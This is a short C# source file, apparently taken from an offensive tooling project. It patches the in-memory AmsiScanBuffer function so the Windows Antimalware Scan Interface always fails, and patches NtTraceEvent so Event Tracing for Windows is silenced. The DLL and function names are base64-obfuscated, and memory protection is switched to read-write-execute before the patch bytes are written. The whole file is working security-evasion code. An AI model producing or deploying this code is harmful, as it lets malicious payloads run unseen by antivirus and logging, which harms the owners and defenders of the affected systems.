using System;
using System.Runtime.InteropServices;

public class MemoryPatcher
{
    private static void PatchMemory(IntPtr baseAddress, byte[] patch)
    {
        IntPtr processHandle = new IntPtr(-1);
        UInt32 NumberOfBytesToProtect = (UInt32)patch.Length;
        UInt32 oldAccessProtection = 0;
        Utility.NtProtectVirtualMemory(processHandle, ref baseAddress, ref NumberOfBytesToProtect, 0x40, ref oldAccessProtection);
        Marshal.Copy(patch, 0, baseAddress, patch.Length);
        Utility.NtProtectVirtualMemory(processHandle, ref baseAddress, ref NumberOfBytesToProtect, oldAccessProtection, ref oldAccessProtection);
    }

    public static void PatchAMSI()
    {
        byte[] patch = IntPtr.Size == 4 ? (new byte[8] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }) : (new byte[6] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 });
        IntPtr baseAddress = Utility.GetFunctionAddress("YW1zaS5kbGw=", "QW1zaVNjYW5CdWZmZXI=");
        if (baseAddress != IntPtr.Zero)
            PatchMemory(baseAddress, patch);
    }

    public static void PatchETW()
    {
        byte[] patch = IntPtr.Size == 4 ? (new byte[3] { 0xC2, 0x10, 0x00 }) : (new byte[1] { 0xC3 });
        IntPtr baseAddress = Utility.GetFunctionAddress("bnRkbGwuZGxs", "TnRUcmFjZUV2ZW50");
        if (baseAddress != IntPtr.Zero)
            PatchMemory(baseAddress, patch);
    }
}
